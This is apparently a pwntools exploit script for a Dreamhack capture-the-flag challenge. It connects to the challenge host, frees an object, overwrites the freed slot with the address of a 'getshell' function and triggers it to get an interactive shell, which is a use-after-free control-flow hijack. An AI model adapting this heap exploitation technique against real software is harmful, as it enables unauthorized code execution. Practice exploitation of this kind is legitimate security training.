from pwn import *

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 22725
r = remote(HOST, PORT)

def change(ptr, func):
    r.sendlineafter(b': ', b'1')
    r.sendlineafter(b': ', str(ptr).encode())
    r.sendlineafter(b': ', str(func).encode())

def delete(ptr):
    r.sendlineafter(b': ', b'2')
    r.sendlineafter(b': ', str(ptr).encode())

def test(ptr):
    r.sendlineafter(b': ', b'3')
    r.sendlineafter(b': ', str(ptr).encode())

def write(data):
    r.sendlineafter(b': ', b'4')
    r.sendlineafter(b': ', data)

def view():
    r.sendlineafter(b': ', b'5')

getshell=0x40161d

delete(1)
write(b'A'*16)
write(p64(getshell)+p64(0))
test(2)

r.interactive()